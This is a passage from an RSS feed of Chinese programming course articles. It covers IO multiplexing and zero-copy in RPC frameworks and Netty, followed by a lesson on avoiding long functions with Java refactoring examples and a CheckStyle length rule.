&lt;p>综合来讲，在这四种常用的 IO 模型中，应用最多的、系统内核与编程语言支持最为完善的，便是阻塞 IO 和 IO 多路复用。这两种 IO 模型，已经可以满足绝大多数网络 IO 的应用场景。&lt;/p>
&lt;h1 id="rpc-框架在网络通信上倾向选择哪种网络-io-模型">RPC 框架在网络通信上倾向选择哪种网络 IO 模型？&lt;/h1>
&lt;p>讲完了这两种最常用的网络 IO 模型，我们可以看看它们都适合什么样的场景。&lt;/p>
&lt;p>IO 多路复用更适合高并发的场景，可以用较少的进程（线程）处理较多的 socket 的 IO 请求，但使用难度比较高。当然高级的编程语言支持得还是比较好的，比如 Java 语言有很多的开源框架对 Java 原生 API 做了封装，如 Netty 框架，使用非常简便；而 GO 语言，语言本身对 IO 多路复用的封装就已经很简洁了。&lt;/p>
&lt;p>而阻塞 IO 与 IO 多路复用相比，阻塞 IO 每处理一个 socket 的 IO 请求都会阻塞进程（线程），但使用难度较低。在并发量较低、业务逻辑只需要同步进行 IO 操作的场景下，阻塞 IO 已经满足了需求，并且不需要发起 select 调用，开销上还要比 IO 多路复用低。&lt;/p>
&lt;p>RPC 调用在大多数的情况下，是一个高并发调用的场景，考虑到系统内核的支持、编程语言的支持以及 IO 模型本身的特点，在 RPC 框架的实现中，在网络通信的处理上，我们会选择 IO 多路复用的方式。开发语言的网络通信框架的选型上，我们最优的选择是基于 Reactor 模式实现的框架，如 Java 语言，首选的框架便是 Netty 框架（Java 还有很多其他 NIO 框架，但目前 Netty 应用得最为广泛），并且在 Linux 环境下，也要开启 epoll 来提升系统性能（Windows 环境下是无法开启 epoll 的，因为系统内核不支持）。&lt;/p>
&lt;p>了解完以上内容，我们可以继续看这样一个关键问题&amp;mdash;&amp;mdash;零拷贝。在我们应用的过程中，他是非常重要的。&lt;/p>
&lt;h1 id="什么是零拷贝">什么是零拷贝？&lt;/h1>
&lt;p>刚才讲阻塞 IO 的时候我讲到，系统内核处理 IO 操作分为两个阶段&amp;mdash;&amp;mdash;等待数据和拷贝数据。等待数据，就是系统内核在等待网卡接收到数据后，把数据写到内核中；而拷贝数据，就是系统内核在获取到数据后，将数据拷贝到用户进程的空间中。以下是具体流程：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/cd/8a/cdf3358f751d2d71564ab58d4f78bc8a.jpg" alt="">&lt;br>
网络IO读写流程&lt;/p>
&lt;p>应用进程的每一次写操作，都会把数据写到用户空间的缓冲区中，再由 CPU 将数据拷贝到系统内核的缓冲区中，之后再由 DMA 将这份数据拷贝到网卡中，最后由网卡发送出去。这里我们可以看到，一次写操作数据要拷贝两次才能通过网卡发送出去，而用户进程的读操作则是将整个流程反过来，数据同样会拷贝两次才能让应用程序读取到数据。&lt;/p>
&lt;p>应用进程的一次完整的读写操作，都需要在用户空间与内核空间中来回拷贝，并且每一次拷贝，都需要 CPU 进行一次上下文切换（由用户进程切换到系统内核，或由系统内核切换到用户进程），这样是不是很浪费 CPU 和性能呢？那有没有什么方式，可以减少进程间的数据拷贝，提高数据传输的效率呢？&lt;/p>
&lt;p>这时我们就需要零拷贝（Zero-copy）技术。&lt;/p>
&lt;p>所谓的零拷贝，就是取消用户空间与内核空间之间的数据拷贝操作，应用进程每一次的读写操作，可以通过一种方式，直接将数据写入内核或从内核中读取数据，再通过 DMA 将内核中的数据拷贝到网卡，或将网卡中的数据 copy 到内核。&lt;/p>
&lt;p>那怎么做到零拷贝？你想一下是不是用户空间与内核空间都将数据写到一个地方，就不需要拷贝了？此时你有没有想到虚拟内存？&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/00/79/0017969e25ed01f650d7879ac0a2cc79.jpg" alt="">&lt;br>
虚拟内存&lt;/p>
&lt;p>零拷贝有两种解决方式，分别是 mmap+write 方式和 sendfile 方式，其核心原理都是通过虚拟内存来解决的。这两种实现方式都不难，市面上可查阅的资料也很多，在此就不详述了，有问题，可以在留言区中解决。&lt;/p>
&lt;h1 id="netty-中的零拷贝">Netty 中的零拷贝&lt;/h1>
&lt;p>了解完零拷贝，我们再看看 Netty 中的零拷贝。&lt;/p>
&lt;p>我刚才讲到，RPC 框架在网络通信框架的选型上，我们最优的选择是基于 Reactor 模式实现的框架，如 Java 语言，首选的便是 Netty 框架。那么 Netty 框架是否也有零拷贝机制呢？Netty 框架中的零拷贝和我之前讲的零拷贝又有什么不同呢？&lt;/p>
&lt;p>刚才我讲的零拷贝是操作系统层面上的零拷贝，主要目标是避免用户空间与内核空间之间的数据拷贝操作，可以提升 CPU 的利用率。&lt;/p>
&lt;p>而 Netty 的零拷贝则不大一样，他完全站在了用户空间上，也就是 JVM 上，它的零拷贝主要是偏向于数据操作的优化上。&lt;/p>
&lt;p>&lt;strong>那么 Netty 这么做的意义是什么呢？&lt;/strong>&lt;/p>
&lt;p>回想下[第 02 讲]，在这一讲中我讲解了 RPC 框架如何去设计协议，其中我讲到：在传输过程中，RPC 并不会把请求参数的所有二进制数据整体一下子发送到对端机器上，中间可能会拆分成好几个数据包，也可能会合并其他请求的数据包，所以消息都需要有边界。那么一端的机器收到消息之后，就需要对数据包进行处理，根据边界对数据包进行分割和合并，最终获得一条完整的消息。&lt;/p>
&lt;p>那收到消息后，对数据包的分割和合并，是在用户空间完成，还是在内核空间完成的呢？&lt;/p>
&lt;p>当然是在用户空间，因为对数据包的处理工作都是由应用程序来处理的，那么这里有没有可能存在数据的拷贝操作？可能会存在，当然不是在用户空间与内核空间之间的拷贝，是用户空间内部内存中的拷贝处理操作。Netty 的零拷贝就是为了解决这个问题，在用户空间对数据操作进行优化。&lt;/p>
&lt;p>那么 Netty 是怎么对数据操作进行优化的呢？&lt;/p>
&lt;ul>
&lt;li>Netty 提供了 CompositeByteBuf 类，它可以将多个 ByteBuf 合并为一个逻辑上的 ByteBuf，避免了各个 ByteBuf 之间的拷贝。&lt;/li>
&lt;li>ByteBuf 支持 slice 操作，因此可以将 ByteBuf 分解为多个共享同一个存储区域的 ByteBuf，避免了内存的拷贝。&lt;/li>
&lt;li>通过 wrap 操作，我们可以将 byte[] 数组、ByteBuf、ByteBuffer 等包装成一个 Netty ByteBuf 对象, 进而避免拷贝操作。&lt;/li>
&lt;/ul>
&lt;p>Netty 框架中很多内部的 ChannelHandler 实现类，都是通过 CompositeByteBuf、slice、wrap 操作来处理 TCP 传输中的拆包与粘包问题的。&lt;/p>
&lt;p>那么 Netty 有没有解决用户空间与内核空间之间的数据拷贝问题的方法呢？&lt;/p>
&lt;p>Netty 的 ByteBuffer 可以采用 Direct Buffers，使用堆外直接内存进行 Socketd 的读写操作，最终的效果与我刚才讲解的虚拟内存所实现的效果是一样的。&lt;/p>
&lt;p>Netty 还提供 FileRegion 中包装 NIO 的 FileChannel.transferTo() 方法实现了零拷贝，这与 Linux 中的 sendfile 方式在原理上也是一样的。&lt;/p>
&lt;h1 id="总结">总结&lt;/h1>
&lt;p>今天我们详细地介绍了阻塞 IO 与 IO 多路复用，拓展了零拷贝相关的知识以及 Netty 框架中的零拷贝。&lt;/p>
&lt;p>考虑到系统内核的支持、编程语言的支持以及 IO 模型本身的特点，RPC 框架在网络通信的处理上，我们更倾向选择 IO 多路复用的方式。&lt;/p>
&lt;p>零拷贝带来的好处就是避免没必要的 CPU 拷贝，让 CPU 解脱出来去做其他的事，同时也减少了 CPU 在用户空间与内核空间之间的上下文切换，从而提升了网络通信效率与应用程序的整体性能。&lt;/p>
&lt;p>而 Netty 的零拷贝与操作系统的零拷贝是有些区别的，Netty 的零拷贝偏向于用户空间中对数据操作的优化，这对处理 TCP 传输中的拆包粘包问题有着重要的意义，对应用程序处理请求数据与返回数据也有重要的意义。&lt;/p>
&lt;p>在 RPC 框架的开发与使用过程中，我们要深入了解网络通信相关的原理知识，尽量做到零拷贝，如使用 Netty 框架；我们要合理使用 ByteBuf 子类，做到完全零拷贝，提升 RPC 框架的整体性能。&lt;/p>
&lt;h1 id="课后思考">课后思考&lt;/h1>
&lt;p>回想一下，你所接触的开源中间件框架有哪些框架在网络通信上做到了零拷贝？都是使用哪种方式实现的零拷贝？&lt;/p>
&lt;p>欢迎留言和我分享你的思考和疑惑，也欢迎你把文章分享给你的朋友，邀请他加入学习。我们下节课再见！&lt;/p></description></item><item><title>极客专栏: 04丨长函数：为什么你总是不可避免地写出长函数？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/04%E4%B8%A8%E9%95%BF%E5%87%BD%E6%95%B0%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E6%80%BB%E6%98%AF%E4%B8%8D%E5%8F%AF%E9%81%BF%E5%85%8D%E5%9C%B0%E5%86%99%E5%87%BA%E9%95%BF%E5%87%BD%E6%95%B0/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/04%E4%B8%A8%E9%95%BF%E5%87%BD%E6%95%B0%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E6%80%BB%E6%98%AF%E4%B8%8D%E5%8F%AF%E9%81%BF%E5%85%8D%E5%9C%B0%E5%86%99%E5%87%BA%E9%95%BF%E5%87%BD%E6%95%B0/</guid><description>
&lt;p>你好，我是郑晔。&lt;/p>
&lt;p>这一讲，我们来讲一个你一定深恶痛绝的坏味道：长函数。&lt;/p>
&lt;p>有一个关于程序员的段子，说程序员一定要用大屏显示器，而且一定要竖起来用，这样才能看到一个函数的全貌。这显然是在调侃函数很长，小屏甚至横屏都不足以看到整个函数，只有竖起来才行。&lt;/p>
&lt;p>只要一提到长函数，无论是去被迫理解一个长函数的含义，还是要在一个长函数中，小心翼翼地找出需要的逻辑，按照需求微调一下，几乎所有程序员都会有不愉悦的回忆。可以这么说，没有人喜欢长函数，但在实际工作中，却不得不去与各种长函数打交道。&lt;/p>
&lt;p>不知道你在实际工作中遇到最长的函数有多长，几百上千行的函数肯定是不足以称霸的。在我的职业生涯中，经常是我以为自己够见多识广了，但只要新接触到一个有悠久历史的代码库，就总会有突破认知的长函数出现。&lt;/p>
&lt;p>长函数是一个&amp;quot;我一说，你就知道怎么回事&amp;quot;的坏味道，我就不准备用一个典型的长函数来开启这一讲了，否则，这一讲的篇幅都不够了。但是，为了统一认识，我准备先讨论一下多长的函数算是长函数，我们来看一个案例。&lt;/p>
&lt;h1 id="多长的函数才算长">多长的函数才算&amp;quot;长&amp;quot;？&lt;/h1>
&lt;p>有一次，我在一个团队做分享，讲怎么把一个长函数重构成小函数。现场演示之后，我问了大家一个问题：在你心目中，多长的函数才算长呢？&lt;/p>
&lt;p>一个现场听众很认真地思考了一下，给出了一个答案：100 行。我很尴尬地看了一下自己刚刚重构掉的两个函数，最长的一个都不到 100 行。换言之，以他的标准来看，这个函数根本就不是长函数，根本就没有必要重构。&lt;/p>
&lt;p>&lt;strong>对于函数长度容忍度高，这是导致长函数产生的关键点&lt;/strong>。&lt;/p>
&lt;p>如果一个人认为 100 行代码不算长，那在他眼中，很多代码根本就是没有问题的，也就更谈不上看到更多问题了，这其实是一个观察尺度的问题。这就好比，没有电子显微镜之前，人们很难理解疾病的原理，因为看不到病毒，就不可能理解病毒可以致病这个道理。&lt;/p>
&lt;p>&lt;strong>一个好的程序员面对代码库时要有不同尺度的观察能力，看设计时，要能够高屋建瓴，看代码时，要能细致入微&lt;/strong>。&lt;/p>
&lt;p>这里的要点就是，看具体代码时，一定要能够看到细微之处。我在《10x 程序员工作法》专栏中讲到过&amp;quot;任务分解&amp;quot;，关键点就是将任务拆解得越小越好，这个观点对代码同样适用。随着对代码长度容忍度的降低，对代码细节的感知力就会逐渐提升，你才能看到那些原本所谓细枝末节的地方隐藏的各种问题。&lt;/p>
&lt;p>回到具体的工作中，&amp;ldquo;越小越好&amp;quot;是一个追求的目标，不过，没有一个具体的数字，就没办法约束所有人的行为。所以，通常情况下，我们还是要定义出一个代码行数的上限，以保证所有人都可以按照这个标准执行。&lt;/p>
&lt;p>我自己写代码的习惯是这样的。像 Python、Ruby 这样表达能力比较强的动态语言，大多数情况下，一行代码（one-liner program）可以解决很多问题，所以，我对自己的要求大约是 5 行左右，并且能够用一行代码解决的问题，就尽量会用一行代码解决；而像 Java 这样表达能力稍弱的静态类型语言，我也争取在 10 行代码之内解决问题。&lt;/p>
&lt;p>当然，这是我对自己的要求，在实际的项目中，可能不是每个人都能做到这一点，所以，我给了一个更为宽松的限制，在自己的标准上翻了番，也就是 20 行。&lt;/p>
&lt;p>这不是一个说说就算的标准，我们应该把它变成一个可执行的标准。比如，在 Java 中，我们就可以把代码行的约束加到 CheckStyle 的配置文件中，就像下面这样：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;module name=&amp;#34;MethodLength&amp;#34;&amp;gt;
&amp;lt;property name=&amp;#34;tokens&amp;#34; value=&amp;#34;METHOD_DEF&amp;#34;/&amp;gt;
&amp;lt;property name=&amp;#34;max&amp;#34; value=&amp;#34;20&amp;#34;/&amp;gt;
&amp;lt;property name=&amp;#34;countEmpty&amp;#34; value=&amp;#34;false&amp;#34;/&amp;gt;
&amp;lt;/module&amp;gt;
&lt;/code>&lt;/pre>&lt;p>这样，在我们提交代码之前，执行本地的构建脚本，就可以把长函数检测出来（关于 CheckStyle，我在《10x 程序员工作法》中讲项目自动化时专门做过介绍，你有兴趣不妨了解一下）。如果你用的是其它的程序设计语言，不妨也找一下相应的静态检查工具，看看是否提供类似的配置。&lt;/p>
&lt;p>我知道，即便是以 20 行为上限，这也已经超过很多人的认知，具体的函数行数可以结合团队的实际情况来制定，但是，我非常不建议把这个数字放得很大，就像我前面说的那样，如果你放到 100 行，这个数字基本上是没有太多意义的，对团队也起不到什么约束作用。&lt;/p>
&lt;p>我之所以要先讨论多长的函数算是长函数，是因为如果你不能认识到代码行的标准应该很低，那么在接下来的讨论中，有些代码示例可能在你看来，就根本不需要调整了。&lt;/p>
&lt;h1 id="长函数的产生">长函数的产生&lt;/h1>
&lt;p>不过，限制函数长度，是一种简单粗暴的解决方案。最重要的是你要知道，长函数本身是一个结果，如果不理解长函数产生的原因，还是很难写出整洁的代码。接下来，我们就来看看长函数是怎么产生的。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>以性能为由&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>人们写长函数的历史由来已久。在《软件设计之美》专栏里，我讲过程序设计语言的发展历史。像 C 语言这种在今天已经是高性能的程序设计语言，在问世之初，也曾被人质疑性能不彰，尤其是函数调用。&lt;/p>
&lt;p>在一些写汇编语言的人看来，调用函数涉及到入栈出栈的过程，显然不如直接执行来得性能高。这种想法经过各种演变流传到今天，任何一门新语言出现，还是会以同样的理由被质疑。&lt;/p>
&lt;p>所以，在很多人看来，把函数写长是为了所谓性能。不过，这个观点在今天是站不住的。&lt;strong>性能优化不应该是写代码的第一考量。&lt;/strong>&lt;/p>
&lt;p>一方面，一门有活力的程序设计语言本身是不断优化的，无论是编译器，还是运行时，性能都会越来越好；另一方面，可维护性比性能优化要优先考虑，当性能不足以满足需要时，我们再来做相应的测量，找到焦点，进行特定的优化。这比在写代码时就考虑所谓性能要更能锁定焦点，优化才是有意义的。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>平铺直叙&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>除了以性能为由把代码写长，还有一种最常见的原因也会把代码写长，那就是写代码平铺直叙，把自己想到的一点点罗列出来。比如下面这段代码（如果你不想仔细阅读，可以直接跳到后面）：&lt;/p>
&lt;pre tabindex="0">&lt;code>public void executeTask() {
ObjectMapper mapper = new ObjectMapper();
CloseableHttpClient client = HttpClients.createDefault();
List&amp;lt;Chapter&amp;gt; chapters = this.chapterService.getUntranslatedChapters();
for (Chapter chapter : chapters) {
// Send Chapter
SendChapterRequest sendChapterRequest = new SendChapterRequest();
sendChapterRequest.setTitle(chapter.getTitle());
sendChapterRequest.setContent(chapter.getContent());
HttpPost sendChapterPost = new HttpPost(sendChapterUrl);
CloseableHttpResponse sendChapterHttpResponse = null;
String chapterId = null;
try {
String sendChapterRequestText = mapper.writeValueAsString(sendChapterRequest);
sendChapterPost.setEntity(new StringEntity(sendChapterRequestText));
sendChapterHttpResponse = client.execute(sendChapterPost);
HttpEntity sendChapterEntity = sendChapterPost.getEntity();
SendChapterResponse sendChapterResponse = mapper.readValue(sendChapterEntity.getContent(), SendChapterResponse.class);
chapterId = sendChapterResponse.getChapterId();
} catch (IOException e) {
throw new RuntimeException(e);
} finally {
try {
if (sendChapterHttpResponse != null) {
sendChapterHttpResponse.close();
}
} catch (IOException e) {
// ignore
}
}
// Translate Chapter
HttpPost translateChapterPost = new HttpPost(translateChapterUrl);
CloseableHttpResponse translateChapterHttpResponse = null;
try {
TranslateChapterRequest translateChapterRequest = new TranslateChapterRequest();
translateChapterRequest.setChapterId(chapterId);
String translateChapterRequestText = mapper.writeValueAsString(translateChapterRequest);
translateChapterPost.setEntity(new StringEntity(translateChapterRequestText));
translateChapterHttpResponse = client.execute(translateChapterPost);
HttpEntity translateChapterEntity = translateChapterHttpResponse.getEntity();
TranslateChapterResponse translateChapterResponse = mapper.readValue(translateChapterEntity.getContent(), TranslateChapterResponse.class);
if (!translateChapterResponse.isSuccess()) {
logger.warn(&amp;#34;Fail to start translate: {}&amp;#34;, chapterId);
}
} catch (IOException e) {
throw new RuntimeException(e);
} finally {
if (translateChapterHttpResponse != null) {
try {
translateChapterHttpResponse.close();
} catch (IOException e) {
// ignore
}
}
}
}
&lt;/code>&lt;/pre>&lt;p>这段代码的逻辑是，把没有翻译过的章节发到翻译引擎，然后，启动翻译过程。在这里翻译引擎是另外一个服务，需要通过 HTTP 的形式向它发送请求。相对而言，这段代码还算直白，当你知道了我上面所说的逻辑，你是很容易看懂这段代码的。&lt;/p>
&lt;p>这段代码之所以很长，主要原因就是把前面所说的逻辑全部平铺直叙地摆在那里了，这里既有业务处理的逻辑，比如，把章节发送给翻译引擎，然后，启动翻译过程；又有处理的细节，比如，把对象转成 JSON，然后，通过 HTTP 客户端发送出去。&lt;/p>
&lt;p>从这段代码中，我们可以看到平铺直叙的代码存在的两个典型问题：&lt;/p>
&lt;ul>
&lt;li>把多个业务处理流程放在一个函数里实现；&lt;/li>
&lt;li>把不同层面的细节放到一个函数里实现。&lt;/li>
&lt;/ul>
&lt;p>这里发送章节和启动翻译是两个过程，显然，这是可以放到两个不同的函数中去实现的，所以，我们只要做一下提取函数，就可以把这个看似庞大的函数拆开，而拆出来的几个函数规模都会小很多，像下面这样：&lt;/p>
&lt;pre tabindex="0">&lt;code>public void executeTask() {
ObjectMapper mapper = new ObjectMapper();
CloseableHttpClient client = HttpClients.createDefault();
List&amp;lt;Chapter&amp;gt; chapters = this.chapterService.getUntranslatedChapters();
for (Chapter chapter : chapters) {
String chapterId = sendChapter(mapper, client, chapter);
translateChapter(mapper, client, chapterId);
}
}
&lt;/code>&lt;/pre>&lt;p>拆出来的部分，实际上就是把对象打包发送的过程，我们以发送章节为例，先来看拆出来的发送章节部分：&lt;/p>
&lt;pre tabindex="0">&lt;code>private String sendChapter(final ObjectMapper mapper,
final CloseableHttpClient client,
final Chapter chapter) {
SendChapterRequest request = asSendChapterRequest(chapter);
CloseableHttpResponse response = null;
String chapterId = null;
try {
HttpPost post = sendChapterRequest(mapper, request);
response = client.execute(post);
chapterId = asChapterId(mapper, post);
} catch (IOException e) {
throw new RuntimeException(e);
} finally {
try {
if (response != null) {
response.close();
}
} catch (IOException e) {
// ignore
}
}
return chapterId;
}
private HttpPost sendChapterRequest(final ObjectMapper mapper, final SendChapterRequest sendChapterRequest) throws JsonProcessingException, UnsupportedEncodingException {
HttpPost post = new HttpPost(sendChapterUrl);
String requestText = mapper.writeValueAsString(sendChapterRequest);
post.setEntity(new StringEntity(requestText));
return post;
}
private String asChapterId(final ObjectMapper mapper, final HttpPost sendChapterPost) throws IOException {
String chapterId;
HttpEntity entity = sendChapterPost.getEntity();
SendChapterResponse response = mapper.readValue(entity.getContent(), SendChapterResponse.class);
chapterId = response.getChapterId();
return chapterId;
}
private SendChapterRequest asSendChapterRequest(final Chapter chapter) {
SendChapterRequest request = new SendChapterRequest();
request.setTitle(chapter.getTitle());
request.setContent(chapter.getContent());
return request
&lt;/code>&lt;/pre>&lt;p>当然，这个代码还算不上已经处理得很整洁了，但至少同之前相比，已经简洁了一些。我们只用了最简单的&lt;strong>提取函数&lt;/strong>这个重构手法，就把一个大函数拆分成了若干的小函数。&lt;/p>
&lt;p>顺便说一下，&lt;strong>长函数往往还隐含着一个命名问题&lt;/strong>。如果你看修改后的 sendChapter，其中的变量命名明显比之前要短，理解的成本也相应地会降低。因为变量都是在这个短小的上下文里，也就不会产生那么多的命名冲突，变量名当然就可以写短一些。&lt;/p>
&lt;p>平铺直叙的代码，一个关键点就是没有把不同的东西分解出来。如果我们用设计的眼光衡量这段代码，这就是&amp;quot;分离关注点&amp;quot;没有做好，把不同层面的东西混在了一起，既有不同业务混在一起，也有不同层次的处理混在了一起。我在《软件设计之美》专栏中，也曾说过，&lt;strong>关注点越多越好，粒度越小越好。&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>一次加一点&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>有时，一段代码一开始的时候并不长，就像下面这段代码，它根据返回的错误进行相应地错误处理：&lt;/p>
&lt;pre tabindex="0">&lt;code>if (code == 400 || code == 401) {
// 做一些错误处理
}
&lt;/code>&lt;/pre>&lt;p>然后，新的需求来了，增加了新的错误码，它就变成了这个样子：&lt;/p>
&lt;pre tabindex="0">&lt;code>if (code == 400 || code == 401 || code == 402) {
// 做一些错误处理
}
&lt;/code>&lt;/pre>&lt;p>你知道，一个有生命力的项目经常会延续很长时间，于是，这段代码有很多次被修改的机会，日积月累，它就成了让人不忍直视的代码，比如：&lt;/p>
&lt;pre tabindex="0">&lt;code>if (code == 400 || code == 401 || code == 402 || ...
|| code == 500 || ...
|| ...
|| code == 10000 || ...) {
// 做一些错误处理
}
&lt;/code>&lt;/pre>&lt;p>后来人看到这段代码就想骂人了。当他从版本控制的历史中找到这些代码的作者，去询问这些处理的来龙去脉时，每个人其实都很委屈，他们当时也没做太多，只是加了一个判断条件而已。&lt;/p>
&lt;p>**任何代码都经不起这种无意识的累积，每个人都没做错，但最终的结果很糟糕。**对抗这种逐渐糟糕腐坏的代码，我们需要知道&amp;quot;童子军军规&amp;rdquo;：&lt;/p>
&lt;blockquote>
&lt;p>让营地比你来时更干净。
&amp;mdash;&amp;mdash; 童子军军规&lt;/p>
&lt;/blockquote>
&lt;p>Robert Martin 把它借鉴到了编程领域，简言之，我们应该看看自己对于代码的改动是不是让原有的代码变得更糟糕了，如果是，那就改进它。但这一切的前提是，你要能看出自己的代码是不是让原有的代码变得糟糕了，所以，学习代码的坏味道还是很有必要的。&lt;/p>
&lt;p>至此，我们看到了代码变长的几种常见原因：&lt;/p>
&lt;ul>
&lt;li>以性能为由；&lt;/li>
&lt;li>平铺直叙；&lt;/li>
&lt;li>一次加一点。&lt;/li>
&lt;/ul>
&lt;p>你会发现，代码变长根本是一个无意识的问题，写代码的人没有觉得自己把代码破坏了。但只要你认识到长函数是一个坏味道，后面的许多问题就自然而然地会被发掘出来，至于解决方案，你已经看到了，大部分情况下，就是拆分成各种小函数。&lt;/p>
&lt;h1 id="总结时刻">总结时刻&lt;/h1>
&lt;p>今天我们讲了程序员最深恶痛绝的坏味道：长函数。没有人愿意去阅读长函数，但许多人又会不经意间写出长函数。&lt;/p>
&lt;p>毫无疑问，长函数是一个坏味道。对于团队而言，一个关键点是要定义出长函数的标准。不过，过于宽泛的标准是没有意义的，想要有效地控制函数规模，几十行的函数已经是标准的上限了，这个标准越低越好。&lt;/p>
&lt;p>我们还分析了长函数产生的原因：&lt;/p>
&lt;ul>
&lt;li>有人以性能为借口；&lt;/li>
&lt;li>有人把代码平铺直叙地摊在那里；&lt;/li>
&lt;li>有人只是每次增加了一点点。&lt;/li>
&lt;/ul>
&lt;p>其中，平铺直叙是把函数写长最常见的原因。之所以会把代码平摊在那里，一方面是把多个业务写到了一起，另一方面是把不同层次的代码写到了一起。究其根因，那是&amp;quot;分离关注点&amp;quot;没有做好。&lt;/p>
&lt;p>每次增加一点点，是另外一个让代码变长的原因，应对它的主要办法就是要坚守&amp;quot;童子军军规&amp;quot;，但其背后更深层次的支撑就是要对坏味道有着深刻的认识。&lt;/p>
&lt;p>如果今天的内容你只能记住一件事，那请记住：&lt;strong>把函数写短，越短越好&lt;/strong>。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/17/bf/17ef4030fb39dc02400f8e03e2547cbf.jpg" alt="">&lt;/p>
&lt;h1 id="思考题">思考题&lt;/h1>
&lt;p>你在实际的工作中遇到过长函数吗？讲讲你和长函数斗争的故事，欢迎在留言区写下你的经历。如果你身边有人正在为&amp;quot;长函数&amp;quot;苦恼，也欢迎你把这节课分享给他。&lt;/p>
&lt;p>感谢阅读，我们下一讲再见！&lt;/p>
&lt;p>参考资料：&lt;/p>
&lt;p>一个好的项目自动化应该是什么样子的？&lt;/p>
&lt;p>语言的模型：如何打破单一语言局限，让设计更好地落地？&lt;/p>
&lt;p>分离关注点：软件设计至关重要的第一步&lt;/p></description></item></channel></rss>